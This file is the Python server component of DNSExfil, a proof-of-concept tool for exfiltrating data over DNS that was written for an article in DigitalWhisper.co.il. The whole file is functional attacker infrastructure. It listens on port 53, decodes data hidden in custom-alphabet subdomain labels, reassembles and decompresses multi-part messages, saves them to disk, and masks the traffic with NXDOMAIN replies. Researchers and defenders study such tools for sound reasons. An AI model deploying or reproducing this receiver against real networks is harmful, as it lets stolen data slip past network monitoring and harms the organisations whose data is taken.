#!/usr/bin/python3
# -*- coding: utf-8 -*-
# DNSExfil - Exfiltrate data using DNS (PoC for DigitalWhisper.co.il).
# Copyright (C) 2021  Maor Gordon
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

import argparse
import logging
import sys
import pathlib
from datetime import datetime
import string

from dnslib import DNSRecord, RCODE
from DNSExfil import Alphabet, compression, DNSServer, ID


def center_text(text: str, line_width: int = 60) -> str:
    padding = " " * ((line_width - len(text)) // 2)
    return f"{padding}{text}{padding}"


banner = f"""

██████╗░███╗░░██╗░██████╗███████╗██╗░░██╗███████╗██╗██╗░░░░░
██╔══██╗████╗░██║██╔════╝██╔════╝╚██╗██╔╝██╔════╝██║██║░░░░░
██║░░██║██╔██╗██║╚█████╗░█████╗░░░╚███╔╝░█████╗░░██║██║░░░░░
██║░░██║██║╚████║░╚═══██╗██╔══╝░░░██╔██╗░██╔══╝░░██║██║░░░░░
██████╔╝██║░╚███║██████╔╝███████╗██╔╝╚██╗██║░░░░░██║███████╗
╚═════╝░╚═╝░░╚══╝╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝
{center_text("Server")}
{center_text("Exfiltrate data using DNS (PoC for DigitalWhisper.co.il)")}
"""

ENCODING = "utf-8"
FORMATTER = logging.Formatter("\r[%(levelname)s] %(message)s", "%H:%M:%S")
LOGGER = logging.getLogger()
HANDLER = logging.StreamHandler(sys.stdout)
HANDLER.setLevel(logging.DEBUG)
HANDLER.setFormatter(FORMATTER)
LOGGER.addHandler(HANDLER)
FILE_FORMAT = "%Y-%m-%d-%H-%M-%S-ID{message_id}"

CASE_SENSITIVE: Alphabet = Alphabet(b'abcdefghijklmnopqrstuvwxyz1234567890')
CASE_INSENSITIVE: Alphabet = Alphabet(b'abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHJKLMNPQRSTUVWXYZ')
HUMAN_READABLE: Alphabet = Alphabet(b'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz1234567890')
RFC4648: Alphabet = Alphabet(b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789')
BASE58_BITCOIN: Alphabet = Alphabet(b'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz')
BASE58_RIPPLE: Alphabet = Alphabet(b'rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz')

presets = {
    "CASE_SENSITIVE": CASE_SENSITIVE,
    "CASE_INSENSITIVE": CASE_INSENSITIVE,
    "HUMAN_READABLE": HUMAN_READABLE,
    "RFC4648": RFC4648,
    "BASE58_BITCOIN": BASE58_BITCOIN,
    "BASE58_RIPPLE": BASE58_RIPPLE,
    "default": CASE_SENSITIVE
}

# ----- Compression Functionality -----
compressions = {getattr(i, '__id__').lower(): i for i in compression.Compression.__subclasses__()}

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=banner, formatter_class=argparse.RawTextHelpFormatter)

    parser.add_argument(
        'subdomain', metavar='SUBDOMAIN', type=str,
        help='the subdomain that receives the information')

    group = parser.add_argument_group('Alphabet Settings', description="Change Encoding Settings")

    alphabet_input_group = group.add_mutually_exclusive_group(required=False)

    alphabet_input_group.add_argument(
        '--alphabet_preset', choices=presets.keys(), default="default", required=False,
        help='select from a pre-made set of encodings')

    alphabet_input_group.add_argument(
        '-c', '--chars', type=str, required=False, metavar=string.ascii_uppercase[:10],
        help='specify characters for the encoding')

    alphabet_input_group.add_argument(
        '-r', '--range', type=str, required=False, metavar="A-Za-z",
        help='specify range of ASCII characters for the encoding')

    group.add_argument(
        '-rnd', '--randomize', required=False, action='store_true', help='Randomize the order of the characters'
                                                                         ' (recommended to use with -rs)')

    group.add_argument(
        '-seed', '--random_seed', required=False, type=int, help='Random seed used (does nothing without -r)')

    parser.add_argument(
        '-v', '--verbose', required=False, action='store_true', help='Show Debug Data')

    group_domain = parser.add_argument_group('Domain Decryption Settings')
    group_domain.add_argument(
        '--compress', choices=compressions.keys(), type=str.lower, default=None, required=False,
        help='select from a selected set of compressions')

    group_server = parser.add_argument_group('Server Settings')
    group_server.add_argument(
        '--protocol', choices=["UDP", "TCP"], type=str.upper, default="UDP", required=False,
        help='select protocol for the server')

    group_server.add_argument(
        '--host', type=str, required=False, metavar="0.0.0.0", default="0.0.0.0",
        help='IP address of the listening server')

    group_server.add_argument(
        '--port', required=False, metavar="53", type=int, default=53, help='Port of the listening server')

    group_server.add_argument(
        '--max_connections', required=False, metavar="5", type=int, default=5,
        help='In TCP only: # of Maximum Connections allowed')

    group_output = parser.add_argument_group('Output Settings')
    group_output.add_argument(
        '-o', '--output', required=False, metavar='FOLDER', type=str, help='Output to folder')

    args = parser.parse_args()

    LOGGER.setLevel(logging.DEBUG if args.verbose else logging.INFO)  # Set Verbose Level
    LOGGER.debug(f"Args: {args}")

    subdomain = args.subdomain
    LOGGER.debug(f"Subdomain: {subdomain}")

    if args.randomize:
        LOGGER.debug(f"Random: True | Random Seed: {args.random_seed}")
        if args.random_seed is None:
            LOGGER.warning("Randomize flag is set without a random seed. Either set a random seed or find some other"
                           " way for the receiving computer to get the shuffled alphabet.")

    # Create Alphabet Object
    rand_kwargs = dict(random_order=args.randomize, random_seed=args.random_seed) if args.randomize else dict()
    if args.chars is not None:
        alph = Alphabet(args.chars, **rand_kwargs)
    elif args.range is not None:
        alph = Alphabet.from_range(args.range, **rand_kwargs)
    else:
        alph = Alphabet(presets[args.alphabet_preset].chars, **rand_kwargs)

    LOGGER.debug(f"Alphabet: {str(alph)}")

    compress_class = compressions.get(args.compress, compression.NoCompress)
    LOGGER.debug(f"Compression: {compress_class}")

    output_path = None
    if args.output:
        output_path = pathlib.Path(args.output)
        LOGGER.debug(f"Output: '{output_path}'")
        if output_path.exists() and not output_path.is_dir():
            raise FileExistsError(f"Output {output_path} is a file!")
        else:
            output_path.mkdir(parents=True, exist_ok=True)
            LOGGER.debug(f"Created Folder '{output_path.resolve()}'")

    server = DNSServer(host=args.host, port=args.port, protocol=args.protocol, max_connections=args.max_connections)
    temp = dict()
    last = list()


    @server.on_incoming_data
    def new_data(data: bytes, addr):
        global temp, last
        LOGGER.info(f'Incoming from {addr}: {data}')
        request_dns = DNSRecord.parse(data)
        domain = str(request_dns.q.qname)
        domain = domain.rstrip(".")  # remove dot in the end
        try:
            if subdomain.lower() in domain.lower():
                split = domain.split(".")[:-(subdomain.count(".") + 1)]
                message_id: ID = ID.from_hash(split[-1])
                index = int(split[-2]) - 1 if split[-2].lower() != "t-1" else -1
                total_length = int(split[-3])
                data = b"".join([alph.decode(i) for i in split[:-3]])
                temp.setdefault(message_id, {index: data}).update({index: data})
                LOGGER.debug(f"Temp: {temp}")

                if -1 in temp[message_id]:
                    # Message Reconstruction
                    full_message = b""
                    for i in sorted(temp[message_id].keys())[1:]:
                        full_message += temp[message_id][i]
                    full_message += temp[message_id][-1]

                    if len(full_message) == total_length and ID(full_message) == message_id:
                        if not full_message in last:
                            full_msg = compress_class.decompress(full_message)
                            print(f"FULL: {message_id} {total_length}: {full_msg}")
                            if args.output:
                                output_file = output_path / datetime.now().strftime(FILE_FORMAT).format(
                                    message_id=message_id)
                                with output_file.open("wb") as f:
                                    f.write(full_msg)

                            temp.pop(message_id)
                            last.append(full_message)
                            last = last[-4:]
        except:
            LOGGER.warning(f"FAILED! | {domain}")
        ans = request_dns.reply()
        ans.header.rcode = getattr(RCODE, 'NXDOMAIN')
        return ans.pack()


    # In later versions i'll add the ability to listen on multiple subdomains in both TCP and UDP.
    # For now, this should suffice.
    server.run()
